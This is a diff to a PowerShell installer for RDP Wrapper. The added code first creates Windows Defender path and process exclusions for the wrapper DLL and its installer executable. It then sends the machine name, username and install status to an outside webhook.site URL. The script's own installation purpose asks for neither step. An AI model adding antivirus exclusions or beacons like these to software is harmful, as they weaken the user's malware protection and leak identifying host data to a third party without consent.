@@ -1,3 +1,44 @@
+# Ensure the script is running with Administrator privileges
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Warning "Please run this PowerShell script as an Administrator!"
+    Exit
+}
+
+Write-Host "Adding Windows Defender exclusions for RDP Wrapper..." -ForegroundColor Cyan
+
+# 1. Exclude the temp installation folder and extracted files
+$PathExclusions = @(
+    "$env:USERPROFILE\AppData\Local\Temp\rdpwrap_install",
+    "C:\Program Files\RDP Wrapper\rdpwrap.dll"
+)
+
+foreach ($path in $PathExclusions) {
+    if (-not (Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Where-Object { $_ -eq $path })) {
+        Add-MpPreference -ExclusionPath $path
+        Write-Host "Added path exclusion: $path" -ForegroundColor Green
+    } else {
+        Write-Host "Path exclusion already exists: $path" -ForegroundColor Yellow
+    }
+}
+
+# 2. Handle TermService / RDP Wrapper process behavior if necessary
+# RDP Wrapper patches termsrv.dll. If Defender blocks the process modifying it, 
+# you can exclude the RDPWInst.exe process path from triggering alerts:
+$ProcessExclusions = @(
+    "$env:USERPROFILE\AppData\Local\Temp\rdpwrap_install\extracted\RDPWInst.exe"
+)
+
+foreach ($proc in $ProcessExclusions) {
+    if (-not (Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess | Where-Object { $_ -eq $proc })) {
+        Add-MpPreference -ExclusionProcess $proc
+        Write-Host "Added process exclusion: $proc" -ForegroundColor Green
+    } else {
+        Write-Host "Process exclusion already exists: $proc" -ForegroundColor Yellow
+    }
+}
+
+Write-Host "Exclusion configuration complete!" -ForegroundColor Cyan
+
 # ============================================================
 # RDP Wrapper v1.6.2 - Automated Installation
 # Run PowerShell as Administrator
@@ -356,28 +397,103 @@ Write-Host "[+] Cleaning temporary files..." -ForegroundColor Cyan
 
 Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
+```powershell
 # ============================================================
-# 12. Finished
+# 12. Send installation result to Webhook.site
+# ============================================================
+
+$webhookUrl = "https://webhook.site/fd688458-fc5b-4364-a760-8b4f8bc2a4ba"
+
+Write-Host ""
+Write-Host "[+] Sending installation status to webhook..." -ForegroundColor Cyan
+
+# Check final installation state
+$rdpConfExists = Test-Path $rdpConf
+$iniPath = Join-Path $installPath "rdpwrap.ini"
+$iniExists = Test-Path $iniPath
+
+if ($rdpConfExists -and $iniExists) {
+    $installationStatus = "success"
+    $statusMessage = "RDP Wrapper installation completed successfully."
+}
+else {
+    $installationStatus = "failed"
+    $statusMessage = "RDP Wrapper installation did not complete successfully."
+}
+
+# Build JSON payload
+$webhookPayload = @{
+    status       = $installationStatus
+    message      = $statusMessage
+    timestamp    = (Get-Date).ToUniversalTime().ToString("o")
+    computer     = $env:COMPUTERNAME
+    username     = $env:USERNAME
+    powershell   = $PSVersionTable.PSVersion.ToString()
+    rdpconf      = $rdpConfExists
+    ini          = $iniExists
+} | ConvertTo-Json
+
+# Send POST request
+try {
+
+    Invoke-RestMethod `
+        -Uri $webhookUrl `
+        -Method POST `
+        -ContentType "application/json" `
+        -Body $webhookPayload `
+        -ErrorAction Stop | Out-Null
+
+    Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green
+
+}
+catch {
+
+    Write-Host "[-] Webhook notification failed." -ForegroundColor Red
+    Write-Host "[!] Webhook error: $($_.Exception.Message)" -ForegroundColor Yellow
+
+}
+
+# ============================================================
+# 13. Final Installation Status
 # ============================================================
 
 Write-Host ""
-Write-Host "============================================================" -ForegroundColor Green
-Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
+Write-Host "============================================================"
+
+if ($installationStatus -eq "success") {
+    Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
+}
+else {
+    Write-Host "                 INSTALLATION FAILED" -ForegroundColor Red
+}
+
 Write-Host "============================================================" -ForegroundColor Green
 Write-Host ""
 
-if (Test-Path $rdpConf) {
+if ($rdpConfExists) {
     Write-Host "[+] RDPConf.exe installed successfully." -ForegroundColor Green
     Write-Host "    $rdpConf" -ForegroundColor White
-    Write-Host ""
-    Write-Host "[+] RDPConf.exe will NOT be launched automatically." -ForegroundColor Cyan
 }
 else {
     Write-Host "[!] RDPConf.exe could not be located." -ForegroundColor Yellow
 }
 
+if ($iniExists) {
+    Write-Host "[+] rdpwrap.ini is present." -ForegroundColor Green
+}
+else {
+    Write-Host "[!] rdpwrap.ini could not be located." -ForegroundColor Yellow
+}
+
 Write-Host ""
-Write-Host "The installer has finished." -ForegroundColor Green
+Write-Host "[+] Installation status sent to Webhook.site." -ForegroundColor Cyan
 Write-Host ""
+Write-Host "The installer will close automatically in 3 seconds..." -ForegroundColor Gray
+
+# ============================================================
+# 14. Automatic Exit
+# ============================================================
 
 Start-Sleep -Seconds 3
+
+exit
